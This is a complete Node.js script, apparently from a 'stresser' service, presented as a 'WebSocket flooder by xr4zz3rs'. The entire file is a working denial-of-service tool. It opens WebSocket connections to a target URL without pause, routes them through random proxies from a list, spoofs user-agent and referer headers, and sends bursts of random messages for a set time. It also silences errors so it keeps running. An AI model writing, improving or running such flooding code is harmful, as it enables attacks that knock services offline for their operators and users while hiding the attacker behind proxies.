  const EventEmitter = require('events');
  const emitter = new EventEmitter();
  emitter.setMaxListeners(Number.POSITIVE_INFINITY);
  process.setMaxListeners(0);
  EventEmitter.defaultMaxListeners = Infinity;
  EventEmitter.prototype._maxListeners = Infinity;
  process.on('uncaughtException', function(err) {
    //console.log(err)
  });
  process.on('unhandledRejection', function() {});
  var fs = require("fs");
  var url = require('url');
  var WebSocket = require('ws');
  var HttpsProxyAgent = require('https-proxy-agent');
  var chalk = require("chalk");

  console.log(chalk.green("WebSocket flooder by xr4zz3rs | realstresser.com"));
  if(process.argv.length != 8)
  {
      console.log(chalk.red("Usage: node WebSocket.js <URL> <PROXY> <UA> <REFERER> <THREADS> <TIME>"));
  }

  var uaFile = process.argv[4];
  var proxiesFile = process.argv[3];
  var refererFile = process.argv[5];
  const UAs = fs.readFileSync(uaFile, 'utf-8').replace(/\r/g, '').split('\n');
  const Referers = fs.readFileSync(refererFile, 'utf-8').replace(/\r/g, '').split('\n');
  var proxies = fs.readFileSync(proxiesFile, 'utf-8').replace(/\r/g, '').split('\n');

  var time = process.argv[7]
  var threads = process.argv[6];
  setInterval(() => {
        var proxy = process.env.http_proxy || 'http://' + proxies[Math.floor(Math.random() * proxies.length)];
        var endpoint = process.argv[2] || 'ws://demos.kaazing.com/echo';
        var parsed = url.parse(endpoint);
        var options = url.parse(proxy);
        options.headers = {
            'User-Agent': UAs[Math.floor(Math.random() * UAs.length)],
            'Referer': Referers[Math.floor(Math.random() * Referers.length)],
            'Cache-Control': 'no-store',
            'Connection': 'Keep-Alive'
        }
         
        var agent = new HttpsProxyAgent(options);
        var socket = new WebSocket(endpoint, "http", { agent: agent });
         
        socket.on('open', function () {
          console.log('"open" event!');
          for(var i = 0; i < parseInt(threads); i++)
          {
            socket.send(RandomString(RandomInteger(20, 210)) + " " + RandomString(RandomInteger(31,112)));
          }
        });
         
        socket.on('message', function (data, flags) {
          console.log('"message" event! %j %j', data, flags);
          socket.close();
        });
  });
  setTimeout(() => process.exit(0), time * 1000);

  function RandomInteger(min, max) {  
    return Math.floor(
      Math.random() * (max - min) + min
    )
  }

  function RandomString(length) {
    var result           = '';
    var characters       = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    var charactersLength = characters.length;
    for ( var i = 0; i < length; i++ ) {
       result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
  }